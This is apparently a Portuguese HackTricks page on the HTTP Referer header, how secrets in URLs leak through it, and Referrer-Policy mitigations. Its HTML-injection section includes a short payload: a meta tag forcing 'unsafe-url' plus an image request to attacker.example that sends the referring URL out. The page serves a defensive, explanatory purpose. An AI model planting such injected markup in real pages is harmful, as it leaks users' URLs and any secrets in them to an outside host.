# Comportamento HTTP Interessante

{{#include ../banners/hacktricks-training.md}}

## Cabeçalho `Referer` e Política de Referrer

O cabeçalho de requisição HTTP `Referer` identifica a URL absoluta ou parcial a partir da qual um recurso foi solicitado. Dependendo da política de referrer ativa, ele pode incluir a origem, o caminho e a query string referentes, mas não o fragmento da URL.<sup>[[1]](#references)</sup>

### Vazamento de Informações Sensíveis

Segredos nos caminhos da URL ou nos parâmetros de consulta podem vazar por meio do histórico do navegador, logs, analytics, links copiados e do cabeçalho `Referer`. Portanto, um link cross-origin ou uma solicitação de sub-recurso pode divulgar a URL referente a um servidor externo.<sup>[[2]](#references)</sup>

### Mitigação

Use o cabeçalho de resposta `Referrer-Policy` para controlar a quantidade de informações de referrer que o navegador envia. `strict-origin-when-cross-origin` é o padrão moderno nos navegadores, enquanto `no-referrer` suprime o cabeçalho completamente; escolha a política que corresponda aos requisitos da aplicação.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
Não coloque senhas, identificadores de sessão, API keys ou outros valores sensíveis em URLs. Envie-os em headers ou bodies de requisição apropriados por TLS.<sup>[[2]](#references)</sup>

### Consideração sobre HTML Injection

Um documento também pode definir uma política para toda a página com `<meta name="referrer">`. Se uma falha de HTML injection permitir que um atacante insira um elemento meta efetivo, o atacante poderá tentar enfraquecer a política do documento para requisições subsequentes. Políticas meta injetadas dinamicamente ou conflitantes podem se comportar de forma imprevisível; portanto, verifique o comportamento no browser alvo em vez de presumir que o response header sempre será sobrescrito.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
Corrija a HTML injection subjacente e mantenha dados sensíveis fora da URL; uma referrer policy é uma defesa em profundidade, não um substituto para nenhum desses controles.

## References

- [1] [MDN - cabeçalho `Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - Uso do método de requisição GET com strings de consulta sensíveis](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - cabeçalho `Referrer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
